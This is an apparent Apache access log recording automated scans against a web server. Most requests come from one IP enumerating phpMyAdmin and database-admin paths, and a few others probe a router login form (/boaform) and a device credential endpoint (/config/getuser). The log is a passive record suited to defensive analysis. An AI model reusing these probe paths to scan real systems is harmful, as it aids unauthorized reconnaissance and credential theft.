102.134.184.26 - - [03/Feb/2023:22:53:47 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.246.220.98 - - [03/Feb/2023:23:03:40 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
179.43.177.242 - - [03/Feb/2023:23:28:15 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
159.65.111.248 - - [03/Feb/2023:23:53:45 -0600] "GET / HTTP/1.0" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"
107.170.249.16 - - [03/Feb/2023:23:59:06 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 zgrab/0.x"
185.246.220.98 - - [04/Feb/2023:00:03:40 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
143.110.222.166 - - [04/Feb/2023:00:08:01 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
23.129.64.217 - - [04/Feb/2023:00:14:34 -0600] "GET / HTTP/1.1" 301 241 "http://skillscybersecurityok.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
193.32.162.159 - - [04/Feb/2023:00:23:42 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
85.25.93.236 - - [04/Feb/2023:00:26:46 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; seocompany/0.6; +; )"
85.25.93.236 - - [04/Feb/2023:00:26:47 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0"
185.225.74.190 - - [04/Feb/2023:00:55:29 -0600] "GET /config/getuser?index=0 HTTP/1.1" 301 263 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
2a06:4880:5000::50 - - [04/Feb/2023:01:28:16 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
193.32.162.159 - - [04/Feb/2023:01:39:27 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [04/Feb/2023:02:05:26 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
31.220.1.83 - - [04/Feb/2023:02:08:01 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
185.180.143.6 - - [04/Feb/2023:02:41:15 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
143.110.222.166 - - [04/Feb/2023:03:08:20 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
193.32.162.159 - - [04/Feb/2023:03:25:16 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [04/Feb/2023:04:04:01 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.177.242 - - [04/Feb/2023:04:15:38 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
62.33.36.161 - - [04/Feb/2023:04:24:01 -0600] "GET /db/websql/index.php?lang=en HTTP/1.1" 301 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:02 -0600] "GET /db/phpmyadmin4/index.php?lang=en HTTP/1.1" 301 273 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:02 -0600] "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.1" 301 275 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:02 -0600] "GET /phpMyAdmin-latest-english/index.php?lang=en HTTP/1.1" 301 284 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:02 -0600] "GET /phpmyadmin1/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:03 -0600] "GET /phpmyadmin2012/index.php?lang=en HTTP/1.1" 301 273 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:03 -0600] "GET /phpMyAdmin-4/index.php?lang=en HTTP/1.1" 301 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:03 -0600] "GET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:04 -0600] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 301 273 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:04 -0600] "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 301 275 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:04 -0600] "GET /shopdb/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:05 -0600] "GET /phpmyadmin4/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:05 -0600] "GET /mysql/dbadmin/index.php?lang=en HTTP/1.1" 301 272 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:05 -0600] "GET /phpmy-admin/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:05 -0600] "GET /php-my-admin/index.php?lang=en HTTP/1.1" 301 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:05 -0600] "GET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:06 -0600] "GET /phpmyadmin5/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:06 -0600] "GET /sql/sql/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:06 -0600] "GET /phpmyadmin2020/index.php?lang=en HTTP/1.1" 301 273 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:06 -0600] "GET /phpMyAdmin-latest-all-languages/index.php?lang=en HTTP/1.1" 301 290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:07 -0600] "GET /administrator/admin/index.php?lang=en HTTP/1.1" 301 278 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:07 -0600] "GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.1" 301 277 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:07 -0600] "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:07 -0600] "GET /phpmyadmin2/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:07 -0600] "GET /phpMyAdmin-5.3.0/index.php?lang=en HTTP/1.1" 301 275 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:08 -0600] "GET /phpmyadmin2012/index.php?lang=en HTTP/1.1" 301 273 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:08 -0600] "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.1" 301 275 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:08 -0600] "GET /phpmyadmin2/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:08 -0600] "GET /mysql/pMA/index.php?lang=en HTTP/1.1" 301 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:08 -0600] "GET /db/phpMyAdmin-4/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:08 -0600] "GET /sql/webadmin/index.php?lang=en HTTP/1.1" 301 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:09 -0600] "GET /db/websql/index.php?lang=en HTTP/1.1" 301 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:09 -0600] "GET /db/dbadmin/index.php?lang=en HTTP/1.1" 301 269 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:09 -0600] "GET /administrator/web/index.php?lang=en HTTP/1.1" 301 276 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:09 -0600] "GET /phpmyadmin1/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:09 -0600] "GET /phppma/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:10 -0600] "GET /sql/phpmyadmin5/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:10 -0600] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:10 -0600] "GET /mysql/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:11 -0600] "GET /index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:11 -0600] "GET /admin/web/index.php?lang=en HTTP/1.1" 301 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:11 -0600] "GET /phpMyAdmin-5.2.0-all-languages/index.php?lang=en HTTP/1.1" 301 289 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:12 -0600] "GET /__phpmyadmin/index.php?lang=en HTTP/1.1" 301 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:12 -0600] "GET /mysql/pMA/index.php?lang=en HTTP/1.1" 301 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:12 -0600] "GET /phpmyadmin4/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:12 -0600] "GET /phpMyAdmin-5/index.php?lang=en HTTP/1.1" 301 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:13 -0600] "GET /phpMyAdmin1/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:13 -0600] "GET /phpMyAdmin-5.2.0/index.php?lang=en HTTP/1.1" 301 275 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:13 -0600] "GET /phpMyAdmin-5.2.0-all-languages/index.php?lang=en HTTP/1.1" 301 289 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:13 -0600] "GET /db/phpmyadmin4/index.php?lang=en HTTP/1.1" 301 273 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:13 -0600] "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:14 -0600] "GET /_phpMyAdmin/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:14 -0600] "GET /admin/pma/index.php?lang=en HTTP/1.1" 301 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:14 -0600] "GET /mysql/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:14 -0600] "GET /db/webdb/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:14 -0600] "GET /phpmyAdmin/index.php?lang=en HTTP/1.1" 301 269 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:15 -0600] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 301 283 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:15 -0600] "GET /db/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 272 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:15 -0600] "GET /phpmyadmin2012/index.php?lang=en HTTP/1.1" 301 273 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:15 -0600] "GET /php-myadmin/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:15 -0600] "GET /shopdb/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:16 -0600] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 301 308 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:16 -0600] "GET /db/dbadmin/index.php?lang=en HTTP/1.1" 301 269 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:16 -0600] "GET /mysql/db/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:16 -0600] "GET /MyAdmin/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:17 -0600] "GET /phpMyAdmin-5.3.0/index.php?lang=en HTTP/1.1" 301 275 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:17 -0600] "GET /sql/phpmy-admin/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:17 -0600] "GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.1" 301 277 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:17 -0600] "GET /program/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:17 -0600] "GET /phpMyAdmin-4/index.php?lang=en HTTP/1.1" 301 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:18 -0600] "GET /sqlmanager/index.php?lang=en HTTP/1.1" 301 269 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:18 -0600] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 301 269 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:18 -0600] "GET /phpmyadmin2013/index.php?lang=en HTTP/1.1" 301 273 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:18 -0600] "GET /__phpmyadmin/index.php?lang=en HTTP/1.1" 301 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:18 -0600] "GET /sql/webadmin/index.php?lang=en HTTP/1.1" 301 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:19 -0600] "GET /phpmy-admin/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:19 -0600] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 301 269 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:19 -0600] "GET /php-my-admin/index.php?lang=en HTTP/1.1" 301 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:19 -0600] "GET /sql/sql/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:19 -0600] "GET /phpmyadmin2021/index.php?lang=en HTTP/1.1" 301 273 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:20 -0600] "GET /shopdb/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:20 -0600] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 301 275 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:20 -0600] "GET /sql/phpmyadmin5/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:20 -0600] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:20 -0600] "GET /PMA/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:20 -0600] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
62.33.36.161 - - [04/Feb/2023:04:24:21 -0600] "GET /phpMyAdmin-4.9.7/index.php?lang=en HTTP/1.1" 301 275 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
